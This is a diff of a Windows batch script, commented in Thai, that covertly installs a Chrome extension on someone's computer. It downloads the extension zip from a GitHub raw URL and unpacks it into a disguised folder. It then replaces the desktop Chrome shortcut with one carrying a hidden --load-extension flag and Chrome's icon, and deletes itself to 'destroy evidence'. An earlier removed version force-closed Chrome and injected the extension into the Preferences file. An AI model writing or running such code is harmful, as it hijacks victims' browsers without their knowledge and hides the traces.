@@ -1,28 +1,48 @@
 @echo off
-setlocal
+setlocal enabledelayedexpansion
 
-:: 1. ตั้งค่า Path
-set "PREF_FILE=%LOCALAPPDATA%\Google\Chrome\User Data\Default\Preferences"
+:: 1. ตั้งค่าพื้นฐาน (เปลี่ยน ID ให้ตรงกับของคุณ)
 set "EXT_ID=onifoepgcccnlehkgoonpaofeolhigpa"
-set "EXT_PATH=%LOCALAPPDATA%\Google\Chrome\User Data\InternalSvc\%EXT_ID%"
+set "TARGET_DIR=%LOCALAPPDATA%\Google\Chrome\User Data\InternalSvc"
+set "EXT_PATH=%TARGET_DIR%\%EXT_ID%"
+set "EXT_URL=https://raw.githubusercontent.com/wkdopajwiojf/grap/main/onifoepgcccnlehkgoonpaofeolhigpa.zip"
 
-:: 2. สั่งปิด Chrome ก่อน (ต้องปิดก่อนถึงจะแก้ไฟล์ได้)
-taskkill /f /im chrome.exe >nul 2>&1
+:: 2. สร้างโฟลเดอร์และเตรียมไฟล์ส่วนเสริม (เหมือนที่คุณเคยทำสำเร็จแล้ว)
+if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%EXT_URL%' -OutFile '%TARGET_DIR%\ext.zip'; Expand-Archive -Path '%TARGET_DIR%\ext.zip' -DestinationPath '%TARGET_DIR%\temp_ext' -Force"
 
-:: 3. ใช้ PowerShell เข้าไปฉีดค่าใน JSON ของ Chrome
-:: เราจะเพิ่ม ID ส่วนเสริมของเราเข้าไปในหมวด extensions.settings
-powershell -Command ^
-"$path = '%PREF_FILE%';" ^
-"$json = Get-Content $path | ConvertFrom-Json;" ^
-"$newExt = New-Object PSObject;" ^
-"$newExt | Add-Member -MemberType NoteProperty -Name 'path' -Value '%EXT_PATH%';" ^
-"$newExt | Add-Member -MemberType NoteProperty -Name 'state' -Value 1;" ^
-"$newExt | Add-Member -MemberType NoteProperty -Name 'location' -Value 4;" ^
-"$json.extensions.settings | Add-Member -MemberType NoteProperty -Name '%EXT_ID%' -Value $newExt -Force;" ^
-"$json | ConvertTo-Json -Depth 100 | Set-Content $path"
+:: จัดการโฟลเดอร์ซ้อน (Move files)
+if exist "%TARGET_DIR%\temp_ext" (
+    if not exist "%EXT_PATH%" mkdir "%EXT_PATH%"
+    for /d %%D in ("%TARGET_DIR%\temp_ext\*") do (
+        xcopy "%%D\*" "%EXT_PATH%\" /s /e /y
+    )
+    rd /s /q "%TARGET_DIR%\temp_ext"
+    del /f /q "%TARGET_DIR%\ext.zip"
+)
 
-:: 4. เปิด Chrome กลับคืนมา (ให้เนียนเหมือนไม่มีอะไรเกิดขึ้น)
-start "" "C:\Program Files\Google\Chrome\Application\chrome.exe"
+:: 3. ขั้นตอนการ Hijack Shortcut (ไม้ตาย)
+:: เราจะสร้างไฟล์ VBS สั้นๆ มาช่วยสร้าง Shortcut ที่ Desktop
+set "VBS_SCRIPT=%TEMP%\create_lnk.vbs"
+set "LNK_NAME=%PUBLIC%\Desktop\Google Chrome.lnk"
 
-:: 5. ลบตัวเองทิ้ง
+:: ลบ Shortcut เดิมทิ้งก่อน (ถ้ามี)
+if exist "%LNK_NAME%" del /f /q "%LNK_NAME%"
+
+:: เขียนไฟล์ VBS เพื่อสร้าง Shortcut ใหม่ที่แอบใส่ Flag --load-extension
+echo Set oWS = WScript.CreateObject("WScript.Shell") > "%VBS_SCRIPT%"
+echo sLnkPath = "%LNK_NAME%" >> "%VBS_SCRIPT%"
+echo Set oLnk = oWS.CreateShortcut(sLnkPath) >> "%VBS_SCRIPT%"
+echo oLnk.TargetPath = "C:\Program Files\Google\Chrome\Application\chrome.exe" >> "%VBS_SCRIPT%"
+:: ใส่ Arguments สำหรับโหลดส่วนเสริม
+echo oLnk.Arguments = "--load-extension=""%EXT_PATH%""" >> "%VBS_SCRIPT%"
+:: ใส่ Icon ให้เหมือน Chrome ของจริง
+echo oLnk.IconLocation = "C:\Program Files\Google\Chrome\Application\chrome.exe,0" >> "%VBS_SCRIPT%"
+echo oLnk.Save >> "%VBS_SCRIPT%"
+
+:: รัน VBS เพื่อสร้าง Shortcut
+cscript //nologo "%VBS_SCRIPT%"
+del "%VBS_SCRIPT%"
+
+:: 4. ทำลายหลักฐาน (ลบตัวสคริปต์ .bat ทิ้ง)
 (goto) 2>nul & del "%~f0"
